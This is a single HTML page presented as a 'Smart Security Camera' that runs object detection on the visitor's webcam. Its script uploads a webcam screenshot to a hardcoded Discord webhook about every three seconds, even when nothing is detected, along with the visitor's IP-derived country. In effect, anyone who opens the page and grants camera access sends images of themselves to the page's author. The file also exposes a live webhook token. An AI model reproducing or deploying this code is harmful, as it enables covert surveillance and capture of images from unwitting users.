<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Tracker - Security Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: #0f3460;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #e94560 0%, #d63447 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .header p {
            opacity: 0.9;
            font-size: 14px;
        }

        .video-container {
            position: relative;
            width: 100%;
            aspect-ratio: 4/3;
            background: #000;
            overflow: hidden;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        #canvas {
            width: 100%;
            height: 100%;
            display: block;
            background: #000;
        }

        .overlay-info {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 15px 20px;
            border-radius: 8px;
            font-size: 14px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(233, 69, 96, 0.5);
        }

        .overlay-info.active {
            background: rgba(233, 69, 96, 0.9);
            border-color: #e94560;
        }

        .detection-status {
            font-size: 12px;
            opacity: 0.8;
        }

        .alert-badge {
            display: inline-block;
            background: #ffb800;
            color: #000;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 8px;
        }

        .controls {
            padding: 20px;
            display: flex;
            gap: 10px;
            background: #1a1a2e;
            border-top: 1px solid #333;
            flex-wrap: wrap;
        }

        button {
            flex: 1;
            min-width: 120px;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        #startBtn {
            background: #e94560;
            color: white;
        }

        #startBtn:hover:not(:disabled) {
            background: #d63447;
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(233, 69, 96, 0.3);
        }

        #startBtn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        #stopBtn {
            background: #555;
            color: white;
        }

        #stopBtn:hover:not(:disabled) {
            background: #666;
        }

        #stopBtn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        .stats {
            padding: 15px 20px;
            background: #16213e;
            border-top: 1px solid #333;
            font-size: 12px;
            color: #aaa;
            font-family: 'Courier New', monospace;
        }

        .stat-line {
            margin: 5px 0;
        }

        .stat-value {
            color: #e94560;
            font-weight: 600;
        }

        .error {
            background: #8b3a3a;
            color: #ff6b6b;
            padding: 15px 20px;
            border-radius: 8px;
            margin: 20px;
        }

        @media (max-width: 600px) {
            .header h1 {
                font-size: 20px;
            }

            .controls {
                flex-direction: column;
            }

            button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Smart Security Camera</h1>
            <p>Real-time object detection with Discord alerts</p>
        </div>

        <div class="video-container">
            <video id="video" playsinline></video>
            <canvas id="canvas"></canvas>
            <div class="overlay-info" id="overlay">
                <div class="detection-status">Ready to detect...</div>
                <div class="alert-badge" id="alertBadge" style="display: none;">Discord Alert Sent</div>
            </div>
        </div>

        <div class="controls">
            <button id="startBtn">Start Camera</button>
            <button id="stopBtn" disabled>Stop</button>
        </div>

        <div class="stats">
            <div class="stat-line">FPS: <span class="stat-value" id="fps">0</span></div>
            <div class="stat-line">Last Detection: <span class="stat-value" id="lastDetection">None</span></div>
            <div class="stat-line">Location: <span class="stat-value" id="country">Loading...</span></div>
            <div class="stat-line">Model: <span class="stat-value">Coco-SSD (Optimized)</span></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd@2"></script>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1438196380899475568/WcC4L1vwJ5KHpz9n4IDraqyWHnaW1LgRfj0Jh_9i5R3mB_9_7bZVwx3XFRBmS8PwjU9o';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const fpsEl = document.getElementById('fps');
        const overlay = document.getElementById('overlay');
        const alertBadge = document.getElementById('alertBadge');
        const lastDetectionEl = document.getElementById('lastDetection');
        const countryEl = document.getElementById('country');

        let model = null;
        let isRunning = false;
        let frameCount = 0;
        let lastTime = Date.now();
        let processFrameCounter = 0;
        const FRAME_SKIP = 2; // Process every 2nd frame (improved from 3) for better FPS
        let lastAlertTime = 0;
        const ALERT_COOLDOWN = 3000; // 3 second cooldown between screenshot sends
        let userCountry = 'Unknown';

        const TARGET_OBJECTS = ['person', 'dog', 'cat', 'bird', 'teddy bear', 'cup', 'bottle', 'backpack', 'handbag'];
        const PRIORITY_OBJECTS = {
            'person': { name: 'Human', emoji: '👤', color: '#ff0000' },
            'dog': { name: 'Dog', emoji: '🐕', color: '#ff9900' },
            'cat': { name: 'Cat', emoji: '🐱', color: '#ff6600' },
            'bird': { name: 'Bird', emoji: '🐦', color: '#ffff00' },
            'teddy bear': { name: 'Teddy Bear', emoji: '🧸', color: '#ff69b4' },
            'cup': { name: 'Cup', emoji: '☕', color: '#00ff00' },
            'bottle': { name: 'Bottle', emoji: '🍾', color: '#00ffff' },
            'backpack': { name: 'Backpack', emoji: '🎒', color: '#ff00ff' },
            'handbag': { name: 'Handbag', emoji: '👜', color: '#00ff99' }
        };

        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                userCountry = data.country_name || 'Unknown';
                countryEl.textContent = userCountry;
            } catch (error) {
                console.error('[v0] Geolocation error:', error);
                countryEl.textContent = 'Error fetching location';
            }
        }

        async function loadModel() {
            try {
                model = await cocoSsd.load();
                console.log('[v0] Model loaded');
            } catch (error) {
                console.error('[v0] Failed to load model:', error);
                showError('Failed to load detection model. Please refresh.');
            }
        }

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 480 },
                        height: { ideal: 360 }
                    }
                });
                video.srcObject = stream;

                return new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        resolve(video);
                    };
                });
            } catch (error) {
                console.error('[v0] Camera error:', error);
                showError('Unable to access camera. Check permissions.');
                throw error;
            }
        }

        async function sendScreenshotToDiscord(detections) {
            const now = Date.now();
            if (now - lastAlertTime < ALERT_COOLDOWN) return;

            try {
                lastAlertTime = now;
                
                // Convert canvas to blob
                canvas.toBlob(async blob => {
                    const formData = new FormData();
                    formData.append('file', blob, 'screenshot.png');
                    
                    const detectionText = detections.length > 0 
                        ? detections.map(d => `${PRIORITY_OBJECTS[d.class]?.emoji || '🎯'} ${d.class.toUpperCase()}`).join(', ')
                        : 'No objects detected';
                    
                    formData.append('payload_json', JSON.stringify({
                        content: `🔔 Security Camera Alert\n📍 Location: ${userCountry}\n🎯 Detection: ${detectionText}`
                    }));

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });

                    alertBadge.style.display = 'block';
                    setTimeout(() => { alertBadge.style.display = 'none'; }, 1500);
                }, 'image/png', 0.8);

            } catch (error) {
                console.error('[v0] Screenshot send failed:', error);
            }
        }

        async function detectObjects() {
            if (!isRunning || !model) return;

            processFrameCounter++;

            if (processFrameCounter % FRAME_SKIP === 0) {
                try {
                    const predictions = await model.detect(video);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const detectedObjects = predictions.filter(p => TARGET_OBJECTS.includes(p.class));
                    
                    if (detectedObjects.length > 0) {
                        overlay.classList.add('active');
                        lastDetectionEl.textContent = detectedObjects.map(d => PRIORITY_OBJECTS[d.class]?.emoji || '🎯').join(' ');
                        await sendScreenshotToDiscord(detectedObjects);
                    } else {
                        overlay.classList.remove('active');
                        await sendScreenshotToDiscord([]); // Send screenshot even if no detections
                    }

                    detectedObjects.forEach((prediction) => {
                        const [x, y, width, height] = prediction.bbox;
                        const objInfo = PRIORITY_OBJECTS[prediction.class];
                        const color = objInfo?.color || '#e94560';

                        ctx.strokeStyle = color;
                        ctx.lineWidth = 2;
                        ctx.strokeRect(x, y, width, height);

                        ctx.fillStyle = color;
                        ctx.fillRect(x, y - 25, 150, 25);
                        ctx.fillStyle = '#fff';
                        ctx.font = 'bold 12px sans-serif';
                        ctx.fillText(
                            `${objInfo?.emoji || '🎯'} ${prediction.class} ${(prediction.score * 100).toFixed(0)}%`,
                            x + 5,
                            y - 8
                        );
                    });

                } catch (error) {
                    console.error('[v0] Detection error:', error);
                }
            } else {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }

            frameCount++;
            const now = Date.now();
            if (now - lastTime >= 1000) {
                fpsEl.textContent = frameCount;
                frameCount = 0;
                lastTime = now;
            }

            requestAnimationFrame(detectObjects);
        }

        function showError(message) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error';
            errorDiv.textContent = message;
            document.querySelector('.container').insertBefore(errorDiv, document.querySelector('.video-container'));
        }

        startBtn.addEventListener('click', async () => {
            try {
                startBtn.disabled = true;
                startBtn.textContent = 'Loading...';
                
                if (!model) await loadModel();
                if (!video.srcObject) {
                    await setupCamera();
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
                
                video.play();
                isRunning = true;
                stopBtn.disabled = false;
                startBtn.textContent = 'Camera Running';
                detectObjects();
            } catch (error) {
                console.error('[v0] Start error:', error);
                startBtn.disabled = false;
                startBtn.textContent = 'Start Camera';
            }
        });

        stopBtn.addEventListener('click', () => {
            isRunning = false;
            video.pause();
            startBtn.disabled = false;
            startBtn.textContent = 'Start Camera';
            stopBtn.disabled = true;
            overlay.classList.remove('active');
            lastDetectionEl.textContent = 'None';
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        });

        window.addEventListener('load', () => {
            loadModel();
            getCountry();
        });
    </script>
</body>
</html>
